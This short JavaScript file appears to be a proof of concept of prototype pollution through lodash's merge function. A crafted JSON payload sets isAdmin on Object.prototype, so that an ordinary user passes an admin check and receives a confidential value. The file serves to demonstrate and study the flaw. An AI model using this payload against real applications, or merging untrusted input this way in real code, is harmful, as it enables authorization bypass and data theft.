var _ = require('lodash');

var confidential = "Password";

var user1 = {
    id : 1,
};

function getConfidential(user)
{
    if(user.isAdmin)
    {
        console.log("Access Given")
        return confidential;
    }
    else {
        console.log("Access Denied");
        return 0;
    }
}

var info = getConfidential(user1);

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'); // If this is provided as 
                                                                                //an argument to be merged
                                                                                // by a malicious user
var payload2; // The malicious user does not provide anything for second argument

if( payload2 == undefined )
result = _.merge({}, payload1);
else 
result =_.merge(payload2,payload1);

var info = getConfidential(user1);
